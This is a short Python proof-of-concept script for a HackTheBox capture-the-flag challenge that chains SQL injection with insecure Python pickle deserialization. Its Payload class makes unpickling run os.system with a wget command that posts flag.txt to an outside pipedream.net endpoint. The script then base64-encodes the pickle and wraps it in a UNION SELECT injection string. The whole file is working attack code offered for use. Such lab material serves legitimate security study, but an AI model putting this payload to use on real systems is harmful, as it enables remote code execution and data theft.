"""
Author      : AnyGuy
Date        : 2023-06-19

Title       : PoC-Pickle.py

Description : Proof-of-Concept Unsecure Deserialization with Python Pickle
    
    - SQLinjection
    - Python - Pickle
    - HackTheBox: Cult of Pickles

"""

# Import Libraries
import sys
import base64
import pickle
import urllib.parse
import requests

class Payload:

  def __reduce__(self):
    import os
    #cmd = ("touch abc.txt")
    cmd = ("wget --post-file flag.txt https://eopsvf8iubn6y5b.m.pipedream.net")
    return os.system, (cmd,)

if __name__ == "__main__":

  payload = base64.b64encode(pickle.dumps(Payload())).decode()

  payload = f"' UNION SELECT '{payload}' -- "

  payload = requests.utils.requote_uri(payload)

  print(payload)
